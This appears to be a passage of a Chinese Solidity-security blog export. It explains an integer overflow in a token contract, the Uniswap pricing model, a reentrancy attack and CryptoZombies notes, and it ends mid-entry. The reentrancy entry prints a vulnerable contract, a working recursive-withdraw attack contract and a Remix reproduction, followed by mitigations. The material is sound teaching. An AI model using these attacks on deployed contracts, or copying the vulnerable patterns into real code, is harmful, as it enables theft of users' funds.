4;</span><br><span class="line">uint8 public constant burnPerTransaction &#x3D; 2;</span><br><span class="line">uint256 public constant initialSupply &#x3D; 420000000000000;</span><br><span class="line">uint256 public currentSupply &#x3D; initialSupply;</span><br><span class="line"></span><br><span class="line">&#x2F;* Create array with balances *&#x2F;</span><br><span class="line">mapping (address &#x3D;&gt; uint256) public balanceOf;</span><br><span class="line">&#x2F;* Create array with allowance *&#x2F;</span><br><span class="line">mapping (address &#x3D;&gt; mapping (address &#x3D;&gt; uint256)) public allowance;</span><br><span class="line"></span><br><span class="line">&#x2F;* Constructor *&#x2F;</span><br><span class="line">function Hexagon() public &#123;</span><br><span class="line">    &#x2F;* Give creator all initial supply of tokens *&#x2F;</span><br><span class="line">    balanceOf[msg.sender] &#x3D; initialSupply;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;* PUBLIC *&#x2F;</span><br><span class="line">&#x2F;* Send tokens *&#x2F;</span><br><span class="line">function transfer(address _to, uint256 _value) public returns (bool success) &#123;</span><br><span class="line">    _transfer(msg.sender, _to, _value);</span><br><span class="line"></span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;* Return current supply *&#x2F;</span><br><span class="line">function totalSupply() public constant returns (uint) &#123;</span><br><span class="line">    return currentSupply;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;* Burn tokens *&#x2F;</span><br><span class="line">function burn(uint256 _value) public returns (bool success) &#123;</span><br><span class="line">    &#x2F;* Check if the sender has enough *&#x2F;</span><br><span class="line">    require(balanceOf[msg.sender] &gt;&#x3D; _value);</span><br><span class="line">    &#x2F;* Subtract from the sender *&#x2F;</span><br><span class="line">    balanceOf[msg.sender] -&#x3D; _value;</span><br><span class="line">    &#x2F;* Send to the black hole *&#x2F;</span><br><span class="line">    balanceOf[0x0] +&#x3D; _value;</span><br><span class="line">    &#x2F;* Update current supply *&#x2F;</span><br><span class="line">    currentSupply -&#x3D; _value;</span><br><span class="line">    &#x2F;* Notify network *&#x2F;</span><br><span class="line">    Burn(msg.sender, _value);</span><br><span class="line"></span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;* Allow someone to spend on your behalf *&#x2F;</span><br><span class="line">function approve(address _spender, uint256 _value) public returns (bool success) &#123;</span><br><span class="line">    &#x2F;* Check if the sender has already  *&#x2F;</span><br><span class="line">    require(_value &#x3D;&#x3D; 0 || allowance[msg.sender][_spender] &#x3D;&#x3D; 0);</span><br><span class="line">    &#x2F;* Add to allowance  *&#x2F;</span><br><span class="line">    allowance[msg.sender][_spender] &#x3D; _value;</span><br><span class="line">    &#x2F;* Notify network *&#x2F;</span><br><span class="line">    Approval(msg.sender, _spender, _value);</span><br><span class="line"></span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;* Transfer tokens from allowance *&#x2F;</span><br><span class="line">function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) &#123;</span><br><span class="line">    &#x2F;* Prevent transfer of not allowed tokens *&#x2F;</span><br><span class="line">    require(allowance[_from][msg.sender] &gt;&#x3D; _value);</span><br><span class="line">    &#x2F;* Remove tokens from allowance *&#x2F;</span><br><span class="line">    allowance[_from][msg.sender] -&#x3D; _value;</span><br><span class="line"></span><br><span class="line">    _transfer(_from, _to, _value);</span><br><span class="line"></span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;* INTERNAL *&#x2F;</span><br><span class="line">function _transfer(address _from, address _to, uint _value) internal &#123;</span><br><span class="line">    &#x2F;* Prevent transfer to 0x0 address. Use burn() instead  *&#x2F;</span><br><span class="line">    require (_to !&#x3D; 0x0);</span><br><span class="line">    &#x2F;* Check if the sender has enough *&#x2F;</span><br><span class="line">    &#x2F;&#x2F;问题代码，数据溢出的攻击点</span><br><span class="line">    require (balanceOf[_from] &gt;&#x3D; _value + burnPerTransaction);</span><br><span class="line">    &#x2F;* Check for overflows *&#x2F;</span><br><span class="line">    require (balanceOf[_to] + _value &gt; balanceOf[_to]);</span><br><span class="line">    &#x2F;* Subtract from the sender *&#x2F;</span><br><span class="line">    balanceOf[_from] -&#x3D; _value + burnPerTransaction;</span><br><span class="line">    &#x2F;* Add the same to the recipient *&#x2F;</span><br><span class="line">    balanceOf[_to] +&#x3D; _value;</span><br><span class="line">    &#x2F;* Apply transaction fee *&#x2F;</span><br><span class="line">    balanceOf[0x0] +&#x3D; burnPerTransaction;</span><br><span class="line">    &#x2F;* Update current supply *&#x2F;</span><br><span class="line">    currentSupply -&#x3D; burnPerTransaction;</span><br><span class="line">    &#x2F;* Notify network *&#x2F;</span><br><span class="line">    Burn(_from, burnPerTransaction);</span><br><span class="line">    &#x2F;* Notify network *&#x2F;</span><br><span class="line">    Transfer(_from, _to, _value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;* Events *&#x2F;</span><br><span class="line">event Transfer(address indexed from, address indexed to, uint256 value);</span><br><span class="line">event Burn(address indexed from, uint256 value);</span><br><span class="line">event Approval(address indexed _owner, address indexed _spender, uint256 _value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>在合约的转账代码 function _transfer(address _from, address _to, uint _value) internal 实现中，判断转账支付方账户是否具有足够的余额，有如下的判断语句：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;问题代码，数据溢出的攻击点</span><br><span class="line">require (balanceOf[_from] &gt;&#x3D; _value + burnPerTransaction);</span><br></pre></td></tr></table></figure>加入攻击者给<code>_value</code>一个很大的值，那么在加上<code>burnPerTransaction</code>后很可能会发生溢出，相加后的结果很小，导致<code>require</code>发生错误的判断。结果给接收方地址增加一笔非常大的TOKEN。下面将举个例子说明：<blockquote><p>假设合约中 burnPerTransaction = 0xf ，<br>所以当转账_value为0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff0时，<br>_value + burnPerTransaction =0 ，即可成功攻击，为balanceOf[_to]增加大量代币。</p></blockquote></li></ul><h1 id="漏洞避免"><a href="#漏洞避免" class="headerlink" title="漏洞避免"></a>漏洞避免</h1><ul><li><p>该段代码安全的写法应该是这样的：</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">require (balanceOf[_from] &gt;&#x3D; _value );</span><br><span class="line">require (balanceOf[_from] &gt;&#x3D; burnPerTransaction);</span><br><span class="line">require (balanceOf[_from] &gt;&#x3D; _value + burnPerTransaction);</span><br></pre></td></tr></table></figure></li><li><p><strong>使用SafeMath</strong><br>  为了避免溢出和下溢的情况，OpenZeppelin 建立了一个叫做 SafeMath 的 库(library)，默认情况下可以防止这些问题。<br>  一个库 是 Solidity 中一种特殊的合约。其中一个有用的功能是给原始数据类型增加一些方法。<br/><br>  比如，使用 SafeMath 库的时候，我们将使用 using SafeMath for uint256 这样的语法。 SafeMath 库有四个方法 — add， sub， mul， 以及 div。现在我们可以这样来让 uint256 调用这些方法：</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">using SafeMath for uint256;</span><br><span class="line"></span><br><span class="line">uint256 a &#x3D; 5;</span><br><span class="line">uint256 b &#x3D; a.add(3); &#x2F;&#x2F; 5 + 3 &#x3D; 8</span><br><span class="line">uint256 c &#x3D; a.mul(2); &#x2F;&#x2F; 5 * 2 &#x3D; 10</span><br></pre></td></tr></table></figure><p>  我们注意到了一个不常见的语法<code>using···for···</code>这是因为SafeMath源码使用了library关键字，库允许我们使用 using 关键字，它可以自动把库的所有方法添加给一个数据类型。<br/><br>  我们来看一下SafeMath的源码：</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">library SafeMath &#123;</span><br><span class="line"></span><br><span class="line">function mul(uint256 a, uint256 b) internal pure returns (uint256) &#123;</span><br><span class="line">    if (a &#x3D;&#x3D; 0) &#123;</span><br><span class="line">    return 0;</span><br><span class="line">    &#125;</span><br><span class="line">    uint256 c &#x3D; a * b;</span><br><span class="line">    assert(c &#x2F; a &#x3D;&#x3D; b);</span><br><span class="line">    return c;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function div(uint256 a, uint256 b) internal pure returns (uint256) &#123;</span><br><span class="line">    &#x2F;&#x2F; assert(b &gt; 0); &#x2F;&#x2F; Solidity automatically throws when dividing by 0</span><br><span class="line">    uint256 c &#x3D; a &#x2F; b;</span><br><span class="line">    &#x2F;&#x2F; assert(a &#x3D;&#x3D; b * c + a % b); &#x2F;&#x2F; There is no case in which this doesn&#39;t hold</span><br><span class="line">    return c;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function sub(uint256 a, uint256 b) internal pure returns (uint256) &#123;</span><br><span class="line">    assert(b &lt;&#x3D; a);</span><br><span class="line">    return a - b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function add(uint256 a, uint256 b) internal pure returns (uint256) &#123;</span><br><span class="line">    uint256 c &#x3D; a + b;</span><br><span class="line">    assert(c &gt;&#x3D; a);</span><br><span class="line">    return c;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>  解释一下源码中的<code>assert</code></p><blockquote><p>assert 和 require 相似，若结果为否它就会抛出错误。 assert 和 require 区别在于，require 若失败则会返还给用户剩下的 gas， assert则不会。所以大部分情况下，你写代码的时候会比较喜欢 require，assert 只在代码可能出现严重错误的时候使用，比如 uint 溢出。</p></blockquote></li></ul>]]></content>
      
      
      <categories>
          
          <category> 基础漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 基础漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>主流DES——Uniswap简介</title>
      <link href="/Uniswap%E7%9A%84%E7%AE%80%E4%BB%8B/"/>
      <url>/Uniswap%E7%9A%84%E7%AE%80%E4%BB%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="主流-DEX—Uniswap介绍"><a href="#主流-DEX—Uniswap介绍" class="headerlink" title="主流 DEX—Uniswap介绍"></a>主流 DEX—Uniswap介绍</h1><hr><pre><code>author：Thomas_Xu</code></pre><h2 id="引入"><a href="#引入" class="headerlink" title="引入"></a>引入</h2><p>以太坊 1.0 的严重限制让简便的 Uniswap 脱颖而出，但以太坊 2.0 和 L2 链下系统将使更复杂的市场蓬勃发展。<br>“有个商业设想。开发一个AMM。不管谁来询价，我随时都能报出一个价格，我的定价算法会用 x * y = k。差不多就这些。想投资吗？”你会躲得远远的。<br/><br>其实，刚才描述的就是 Uniswap。Uniswap 也许是世界上最原始的链上做市商运作。莫名其妙的，它的交易量过去几个月出现爆发式增长，凭交易量已成为世界最大的去中心化交易所（DEX） 。</p><h2 id="展开"><a href="#展开" class="headerlink" title="展开"></a>展开</h2><blockquote><p>我们接下来的只会对niswap的做市机制进行解析，如果想要了解uniswap的底层源码逻辑，可以关注我之后的文章。</p></blockquote><p>Uniswap 是一个自动做市商，即 AMM。你可以把 AMM 设想成一个原始的、机器人式的做市商，它根据一个简单的定价算法，在两种资产之间随时提供报价。对 Uniswap 而言，它对这两种资产进行报价，其持有的每种资产的单位数相乘，总会等于一个常数。如果 Uniswap 拥有一些 x 代币，拥有一些 y 代币，它给每一笔交易定价，所以，它拥有的 x 的最终数量，和拥有的 y 的最终数量，两者相乘会等于一个常数 k。这就形成了一个常数积的等式：<code>x * y = k</code>。<br>这种对两种资产进行定价的方式，你可能会觉得非常怪异且过于独断。让两种代币的库存数相乘所得的积维持固定，为什么就能确保正确的报价呢？<br/><br>下面我们就通过一个简单的例子了解一下Uniswap</p><ul><li><p><strong>Uniswap 示例</strong><br>  假设我们在 Uniswap 的某个池里投入 50 个苹果 （a） 和 50 个香蕉 （b） ，任何人都可以用苹果换香蕉，或者用香蕉换苹果。假设一级市场中苹果与香蕉的汇率刚好是 1:1。因为该 Uniswap 资金池中分别有 50 个苹果和 50 个香蕉，因此，按上述常数积的等式规则，a <em> b = 2500 。对于任何交易，Uniswap 都需要保证，池中库存的苹果数和香蕉数相乘等于 2500。<br/><br>  假设一位客户进入我们的 Uniswap 池来买一个苹果。她应该支付多少个香蕉呢？如果她买走一个苹果，我们的池里就剩下 49 个苹果，而 49</em> b 依然需要等于 2500。这样香蕉的总数 b 就等于 51.02。由于之前池中有 50 个香蕉，因此我们还需要 1.02 个香蕉（在这个宇宙中我们允许碎片化香蕉的存在） ，因此，这位客户买一个苹果会得到的报价是：1.02 香蕉 / 苹果。</p><blockquote><p>请注意，这与两者之间 1:1 的原始价格很接近！因为这只是一笔小额交易，所以滑点较小。</p></blockquote><p>  <img src="Uniswap1.webp" alt=""></p><p>  如果她想买 10 个苹果， Uniswap 的报价会是 12.5 个香蕉，即这 10 个苹果每个的单价为 1.25 香蕉 / 苹果。如果她想要执行 25 个苹果这种大额交易，即要买库存苹果数量的一半，那么，单位价格会上涨到 2 香蕉 / 苹果！ </p><blockquote><p>可以看到当交易额变大，交易价格就会比原始价格成倍增长</p></blockquote></li><li><p><strong>抢先交易攻击（三明治攻击）的引申</strong><br>  在上面对Uniswap的介绍中其实我们可以发现一个好玩的地方。<br/><br>  如果苹果与香蕉之间的真实交易价格是 1:1，当第一位客户买走 10 个苹果后，我们 Uniswap 池就有会变成 40 个苹果和 62.5 个香蕉。如果有位<strong>套利者</strong>此时进入，她买走 12.5 个香蕉，让资金池恢复到最初状态，她只需付 10 个苹果，所以 Uniswap 对她的收费只有 0.8 苹果 / 香蕉。<br>  不难发现，Uniswap 会低价甩卖香蕉！就好像我们的算法此时意识到香蕉过多，所以它低价抛售香蕉，以吸引苹果流入，从而实现库存的再平衡。</p><blockquote><p>抢先交易攻击正是利用了这一特性，来赚取”差价”<br>  具体的抢先交易攻击我会放到下一章来讲</p></blockquote></li><li><p>套利损失（Impermanent Loss）简介</p><p>  下面你将了解 Uniswap 定价机制的工作方式。但这仍然引出一个问题——Uniswap 很好的完成了它工作吗？这东西真的会产生利润吗？毕竟，任何做市商都可以报价，但是否赚钱就不好说了。<br/><br>  答案是：取决于具体情况！具体来说，这取决于一种被称为<strong>套利损失</strong>的概念。它的运作方式如下：<br>  Uniswap 会对每笔交易收取少量费用 （目前为 0.3%） 。这是在名义价格之外的。因此，如果苹果和香蕉总是且永远以 1:1 价格进行交易，随着做市商在交易价格曲线上来回移动，这些费用将随时间累积。那么，与只持有 50 个苹果和 50 个香蕉的基线比较，Uniswap 池最终会积累更多的水果。<br/><br>  但是，如果苹果和香蕉之间的真实交易价格突然发生变化，会发生什么呢？假设某家香蕉农场遭遇了无人机攻击，出现大面积的香蕉短缺。香蕉现在像黄金一样贵。交易价格蹿升到 5 个苹果换 1 个香蕉。<br/><br>  Uniswap 上会发生什么？<br/><br>  套利者一秒都不会耽搁，立马杀入你的 Uniswap 池，抢购便宜的香蕉。他们调整交易规模，以便买走价格低于新汇率 5:1 的所有香蕉。这意味着他们需要移动价格曲线，直到满足以下等式：5x * x = 2500。<br/><br>  <img src="Uniswap2.webp" alt=""><br>  算一下这个数学题，你会得到如下结果：他们总共以 61.80 个苹果买到 27.64 个香蕉。平均交易价格为 2.2 个苹果：1 个香蕉，这远低于市场价，相当于得到 76.4 个免费苹果。</p><blockquote><p>这种现象称为「套利损失」。每当交易价格发生变动，就会出现套利者窃取廉价资产，直到资金池的定价达到正确为止。 </p></blockquote></li></ul><h1 id="结束"><a href="#结束" class="headerlink" title="结束"></a>结束</h1><p>自 2018 年上线以来， Uniswap 已经席卷 DeFi 领域。考虑到 Uniswap 的原始版本只有大约 300 行代码，这一成绩尤其令人惊讶！ （AMM 本身拥有历史悠久的血统，但是常数函数做市商是一个相对较新的发明。） Uniswap 完全无需许可，任何人都可以注入资产。它甚至不需要预言机。回顾一下会发现它非常优雅，是可能发明的最简单的产品之一，它似乎从石头缝里诞生，并主导了 DeFi 领域。</p>]]></content>
      
      
      <categories>
          
          <category> Uniswap </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Uniswap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ReentryAttack</title>
      <link href="/ReentryAttack/"/>
      <url>/ReentryAttack/</url>
      
        <content type="html"><![CDATA[<h1 id="重入攻击分析"><a href="#重入攻击分析" class="headerlink" title="重入攻击分析"></a>重入攻击分析</h1><hr><pre><code>author：Thomas_Xu</code></pre><h2 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><p>在以太坊中，智能合约能够调用其他外部合约的代码，由于智能合约可以调用外部合约或者发送以太币，这些操作需要合约提交外部的调用，所以这些合约外部的调用就可以被攻击者利用造成攻击劫持，使得被攻击合约在任意位置重新执行(回调)，绕过原代码中的限制条件，从而发生重入攻击。重入攻击本质上与编程里的递归调用类似，所以当合约将以太币发送到未知地址时就可能会发生。</p><ul><li><strong>发生条件</strong><ol><li>调用了外部的合约且该合约是不安全的</li><li>外部合约的函数调用早于状态变量的修改</li></ol></li></ul><p>接下来给大家展示的是一个最简单的提款函数：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function withdraw()&#123;</span><br><span class="line">  require(msg.sender,call.value(balances[msg.sender])());</span><br><span class="line">  balances[msg.sender]&#x3D;0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>这种函数大多存在于钱包、去中心化交易所中，目的是为了让用户提款，将合约中的代币转换成通用的以太币。<br/></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><pre><code>在进入分析之前，先介绍几个基础知识</code></pre><ul><li>以太坊常用的转账的方法<ol><li>transfer()：只会发送 2300 gas 进行调用，当发送失败时会通过 throw 来进行回滚操作，从而防止了重入攻击。</li><li>send()：只会发送 2300 gas 进行调用，当发送失败时会返回布尔值 false，从而防止了重入攻击。</li><li>gas().call.vale()()：在调用时会发送所有的 gas，当发送失败时会返回布尔值 false，不能有效的防止重入攻击。</li></ol></li><li><p>fallback函数<br>  回退函数 (fallback function)：回退函数是每个合约中有且仅有一个没有名字的函数，并且该函数无参数，无返回值，如下所示：</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function() public payable&#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>  回退函数在以下几种情况中被执行：</p><ol><li>调用合约时没有匹配到任何一个函数</li><li>没有传数据</li><li>智能合约收到以太币（为了接受以太币，fallback 函数必被标记为 payable）</li></ol></li><li><p>漏洞<br>  通过我们对fallback函数的了解。<br>  如果我们构造一个 fallback 函数，函数里面也调用对方的 withdraw 函数的话，那将会产生一个循环调用转账功能，存在漏洞的合约会不断向攻击者合约转账，终止循环结束（以太坊 gas 有上限）<br>  <img src="Reenter1.png" alt="攻击原理"><br>  我们先来看一段比较典型的有重入漏洞的合约：</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.19;</span><br><span class="line"></span><br><span class="line">contract Reentrance&#123;</span><br><span class="line">    address _owner;</span><br><span class="line">    mapping (address &#x3D;&gt; uint256) balances;</span><br><span class="line"></span><br><span class="line">    function Reentrance()&#123;</span><br><span class="line">        _owner &#x3D; msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw(uint256 amount) public payable&#123;</span><br><span class="line">        require(balances[msg.sender] &gt;&#x3D; amount);</span><br><span class="line">        require(this.balance &gt;&#x3D; amount);</span><br><span class="line">        &#x2F;&#x2F; 发送以太</span><br><span class="line">        msg.sender.call.value(amount)();</span><br><span class="line">        &#x2F;&#x2F; 状态变量修改</span><br><span class="line">        balances[msg.sender] -&#x3D; amount;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function deposit() public payable&#123;</span><br><span class="line">        balances[msg.sender] +&#x3D; msg.value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function balanceOf(address adre)constant returns(uint256)&#123;</span><br><span class="line">        return balances[adre];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function wallet() constant returns(uint256 result)&#123;</span><br><span class="line">        return this.balance;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>  我们来看这个合约的 withdraw 函数，这个函数中的转账操作有一个外部调用（msg.sender.call.value(amount)()），所以我们就可以认为这个合约是可能有重入漏洞的，但是具体能否产生危害还需要更深入的分析：</p><ul><li>攻击者思路：<blockquote><ol><li>所有的外部调用都是不安全的且合约在接收以太的时候会触发 fallback 函数执行相应的逻辑，这是一种隐藏的外部调用，这种隐藏的外部调用是否会造成危害呢？</li><li>我们可以看到在 withdraw 函数中是先执行外部调用进行转账后才修改用户余额状态变量的，那我们可不可以在转账外部调用的时候构造一个恶意的逻辑合约在合约执行 balance[msg.sender] -= amount 之前一直循环调用 withdraw 函数一直提币从而将合约账户清空呢？</li></ol></blockquote></li><li>攻击合约：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.19;</span><br><span class="line">import&quot;.&#x2F;Reentrance.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract ReentranceAttack&#123;</span><br><span class="line">    Reentrance re;</span><br><span class="line">    function ReentranceAttack(address _target) public payable&#123;</span><br><span class="line">        re &#x3D; Reentrance(_target);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function wallet()view returns(uint256)&#123;</span><br><span class="line">        return this.balance;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function deposit()public payable &#123;</span><br><span class="line">        re.deposit.value(msg.value)();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack()&#123;</span><br><span class="line">        re.withdraw(1);</span><br><span class="line">    &#125;</span><br><span class="line">    function () public payable &#123;</span><br><span class="line">        if (address(re).balance &gt;&#x3D; 1 ether)&#123;</span><br><span class="line">            re.withdraw(1);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>攻击原理：<br>  由于受害者合约withdraw函数使用call函数转账，会附加”所有可用gas”，并触发msg.sender的fallback函数。fallback 函数再次调用withdraw函数套利，由于withdraw函数最后一步才减去msg.sender对应的余额并记录导致递归调用withdraw函数require判断都能通过。直到合约中没有可用余额为止。<br>  类似于对攻击者fallback函数的递归调用<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2>首先用账户(<code>0x5B38Da6a701c568545dCfcB03FcB875f56beddC4</code>)模拟受害者，点击depoly开始部署。<br><img src="Reenter2.png" alt=""><br>然后将Value改为5，单位改为ether。点击deposit方法<br><img src="Reenter3.png" alt=""><br>查看当前账户余额为5ether，存款成功<br><img src="Reenter4.png" alt=""><br>创建一个新账户（<code>0xAb8483F64d9C6d1EcF9b849Ae677dD3315835cb2</code>）来模拟攻击者，在Deploy处填写漏洞合约地址，部署攻击合约。<br><img src="Reenter5.png" alt=""><br>部署成功后，先查看攻击合约的wallet为0<br><img src="Reenter6.png" alt=""><br>攻击者先存款 1 ether 到漏洞合约中，这里设置 VALUE 为 1 ether，之后点击攻击合约的 deposit 进行存款。<br><img src="Reenter7.png" alt=""><br>再次调用漏洞合约的wallet方法，却发现有了6 ether<br><img src="Reenter8.png" alt=""><br>攻击者 (<code>0xAb8483F64d9C6d1EcF9b849Ae677dD3315835cb2</code>) 调用攻击合约的 attack 函数模拟攻击，之后调用被攻击合约的 wallet 函数去查看合约的余额，发现已经归零，此时回到攻击合约查看余额，发现被攻击合约中的 6 ether 已经全部提款到了攻击者合约中，这就造成了重入攻击。<br><img src="Reenter9.png" alt=""></li></ul></li></ul><h2 id="漏洞防范"><a href="#漏洞防范" class="headerlink" title="漏洞防范"></a>漏洞防范</h2><ul><li><p><strong>加入防重入锁</strong><br>  下面是一个防重入锁的例子：</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.3;</span><br><span class="line"></span><br><span class="line">contract ReEntrancyGuard &#123;</span><br><span class="line">    bool internal locked;</span><br><span class="line"></span><br><span class="line">    modifier noReentrant() &#123;</span><br><span class="line">        require(!locked, &quot;No re-entrancy&quot;);</span><br><span class="line">        locked &#x3D; true;</span><br><span class="line">        _; </span><br><span class="line">    locked &#x3D; false; </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><strong>写代码时需要遵循先判断，后写入变量在进行外部调用的编码规范（Checks-Effects-Interactions）</strong></p></li><li><p><strong>使用send() 和 transfer() 转币，只会传递2300Gas供调用，防止重入攻击。</strong></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 基础漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 基础漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>僵尸工厂学习记录</title>
      <link href="/corpseFactory/"/>
      <url>/corpseFactory/</url>
      
        <content type="html"><![CDATA[<h1 id="僵尸工厂学习总结"><a href="#僵尸工厂学习总结" class="headerlink" title="僵尸工厂学习总结"></a>僵尸工厂学习总结</h1><h2 id="Lesson-1"><a href="#Lesson-1" class="headerlink" title="Lesson 1"></a>Lesson 1</h2><ul><li><strong>无符号整数：<code>uint</code></strong><br>  <code>uint</code> 无符号数据类型， 指其值不能是负数，对于有符号的整数存在名为 <code>int</code> 的数据类型。<blockquote><p>Solidity中， uint 实际上是 uint256代名词， 一个256位的无符号整数。你也可以定义位数少的uints — uint8， uint16， uint32， 等…… 但一般来讲你愿意使用简单的 uint， 除非在某些特殊情况下。</p></blockquote></li><li><p><strong>Solidity命名习惯</strong></p><blockquote><p>习惯上函数里的变量都是以(_)开头 (但不是硬性规定) 以区别全局变量。</p></blockquote><p>  例如以下的代码：</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function eatHamburgers(string _name, uint _amount) &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><strong>创建新的结构体</strong><ol><li>申明一个结构体： <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">struct Person &#123;</span><br><span class="line">    uint age;</span><br><span class="line">    string name;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Person[] public people;</span><br></pre></td></tr></table></figure></li><li>创建新的 Person 结构，然后把它加入到名为 people 的数组中： <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td 